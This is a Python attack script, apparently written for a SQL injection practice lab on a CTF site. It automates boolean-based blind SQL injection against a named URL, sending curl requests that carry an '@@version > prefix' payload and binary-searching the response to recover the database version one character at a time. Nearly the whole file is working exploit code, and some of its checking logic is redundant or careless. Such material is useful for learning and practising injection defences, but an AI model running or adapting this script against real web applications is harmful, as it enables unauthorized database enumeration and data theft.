#!/usr/bin/env python3
"""
逐字符精确提取 @@version
通过 @@version > 'prefix' 字符串比较
"""
import subprocess
import sys

TARGET = "http://home.ctfstu.cn:6868/sql/Less-1/?id=1'%20%26%26%20@@version%20%3e%20'{prefix}'--+"
TRUE_LEN = 721
FALSE_LEN = 670

def check(prefix):
    url = TARGET.replace("{prefix}", prefix.replace("'", ""))
    result = subprocess.run(
        ["curl", "-s", url],
        capture_output=True, text=True, timeout=8
    )
    content = result.stdout
    return TRUE_LEN if "Your Login name" in content else FALSE_LEN

def extract_character(current_prefix):
    """二分法找下一个字符"""
    low, high = 32, 126
    best_char = None
    
    while low <= high:
        mid = (low + high) // 2
        test_prefix = current_prefix + chr(mid)
        test_url = TARGET.replace("{prefix}", test_prefix)
        
        r = subprocess.run(
            ["curl", "-s", test_url],
            capture_output=True, text=True, timeout=8
        )
        
        is_true = "Your Login name" in r.stdout
        
        if is_true:
            # @@version > 'prefix+char' 为真 → char 还可以更大
            best_char = chr(mid)
            low = mid + 1
        else:
            high = mid - 1
    
    if best_char:
        # 验证 best_char 是否是正确字符
        # @@version > 'prefix+best_char' = TRUE
        # 但 @@version > 'prefix+next_char' = FALSE
        next_char = chr(ord(best_char) + 1)
        test_next = current_prefix + next_char
        next_url = TARGET.replace("{prefix}", test_next)
        r = subprocess.run(
            ["curl", "-s", next_url],
            capture_output=True, text=True, timeout=8
        )
        if "Your Login name" not in r.stdout:
            return best_char
        else:
            return best_char  # anyway
    
    return None

def main():
    result = ""
    max_chars = 80
    
    print("Extracting @@version...")
    
    for pos in range(1, max_chars + 1):
        ch = extract_character(result)
        if ch is None:
            # 尝试用字符集逐个检查
            for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_,/:@! ":
                test_prefix = result + c
                test_url = TARGET.replace("{prefix}", test_prefix)
                r = subprocess.run(
                    ["curl", "-s", test_url],
                    capture_output=True, text=True, timeout=8
                )
                
                is_true = "Your Login name" in r.stdout
                
                if not is_true:
                    # @@version > 'result+c' = FALSE
                    # 确认 @@version > 'result' = TRUE
                    if result:
                        prev_url = TARGET.replace("{prefix}", result)
                        r2 = subprocess.run(
                            ["curl", "-s", prev_url],
                            capture_output=True, text=True, timeout=8
                        )
                        if "Your Login name" in r2.stdout:
                            ch = c
                            break
                    else:
                        # 第一个字符
                        if ord(c) > 33:
                            prev_c = chr(ord(c) - 1)
                            prev_url = TARGET.replace("{prefix}", prev_c)
                            r2 = subprocess.run(
                                ["curl", "-s", prev_url],
                                capture_output=True, text=True, timeout=8
                            )
                            if "Your Login name" in r2.stdout:
                                ch = c
                                break
                        elif c == ' ':
                            continue
        
        if ch is None:
            # 检查是否结束
            if result:
                end_url = TARGET.replace("{prefix}", result)
                r = subprocess.run(
                    ["curl", "-s", end_url],
                    capture_output=True, text=True, timeout=8
                )
                if "Your Login name" not in r.stdout:
                    print(f"\n[DONE] {result}")
                    return result
            print(f"\n[END at pos {pos}]")
            break
        
        result += ch
        sys.stdout.write(f"\r  [{pos}] {result}")
        sys.stdout.flush()
    
    print(f"\nResult: {result}")
    return result

if __name__ == "__main__":
    main()
